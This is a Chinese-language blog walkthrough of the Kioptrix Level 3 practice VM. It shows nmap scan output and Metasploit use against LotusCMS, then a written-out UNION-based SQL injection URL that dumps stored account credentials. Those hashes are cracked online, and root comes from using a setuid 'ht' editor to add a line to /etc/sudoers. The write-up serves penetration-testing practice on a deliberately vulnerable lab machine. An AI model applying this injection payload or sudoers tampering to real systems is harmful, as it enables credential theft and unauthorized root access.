---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 KIOPTRIX:LEVEL 3 Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2022-03-23
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false

typora-root-url: ..\..\..\.vuepress\public
---



扫描目标

```bash
└─# nmap -T5 -A -v -p- 192.168.197.130
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 04:47 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating ARP Ping Scan at 04:47
Scanning 192.168.197.130 [1 port]
Completed ARP Ping Scan at 04:47, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:47
Completed Parallel DNS resolution of 1 host. at 04:47, 13.00s elapsed
Initiating SYN Stealth Scan at 04:47
Scanning 192.168.197.130 [65535 ports]
Discovered open port 22/tcp on 192.168.197.130
Discovered open port 80/tcp on 192.168.197.130
Completed SYN Stealth Scan at 04:47, 3.96s elapsed (65535 total ports)
Initiating Service scan at 04:47
Scanning 2 services on 192.168.197.130
Completed Service scan at 04:47, 6.02s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.197.130
NSE: Script scanning 192.168.197.130.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.16s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Nmap scan report for 192.168.197.130
Host is up (0.00059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
MAC Address: 00:0C:29:5F:2B:EF (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 497.101 days (since Mon Nov  9 01:22:38 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=206 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 192.168.197.130

NSE: Script Post-scanning.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.22 seconds
           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)

```

存在80端口，访问

![image-20220421172004140](/assets/img/image-20220421172004140.png)



点击login查看，发现使用的LotusCMS

![image-20220421172030804](/assets/img/image-20220421172030804.png)

搜索exp

![image-20220421172058784](/assets/img/image-20220421172058784.png)

使用msf

![image-20220421172102677](/assets/img/image-20220421172102677.png)

![image-20220421172107234](/assets/img/image-20220421172107234.png)

获得shell，尝试很多提权不成功

重新查看页面，在http://kioptrix3.com/gallery/index.php里发现注释的文件路径

![image-20220421172113072](/assets/img/image-20220421172113072.png)

访问http://kioptrix3.com/gallery/gadmin/

![image-20220421172118679](/assets/img/image-20220421172118679.png)

再搜索exp

![image-20220421172125489](/assets/img/image-20220421172125489.png)

尝试sql注入，访问http://kioptrix3.com/gallery/gallery.php?id= 返回sql错误信息，确定存在sql注入

通过手动注入http://kioptrix3.com/gallery/gallery.php?id=1%20or%201=0%20union%20select%201,group_concat(char(32),%20username,%20char(32),%20password)%20,3,4,5,6%20from%20dev_accounts--

![image-20220421172131330](/assets/img/image-20220421172131330.png)

使用https://crackstation.net/解密

![image-20220421172137319](/assets/img/image-20220421172137319.png)

使用loneferret账号通过ssh登录

![image-20220421172141908](/assets/img/image-20220421172141908.png)

在home目录下发现一个文件

![image-20220421172146161](/assets/img/image-20220421172146161.png)

查看ht，发现存在s权限

![image-20220421172151403](/assets/img/image-20220421172151403.png)

搜索ht，发现是一个二进制编辑器，可以用来编辑修改/etc/sudoers,F6切换到text内容显示

在最后一行加入

loneferret ALL=(ALL) ALL 

保存退出

![image-20220421172158053](/assets/img/image-20220421172158053.png)

执行sudo su，获得root

![image-20220421172202284](/assets/img/image-20220421172202284.png)

![image-20220421172206012](/assets/img/image-20220421172206012.png)
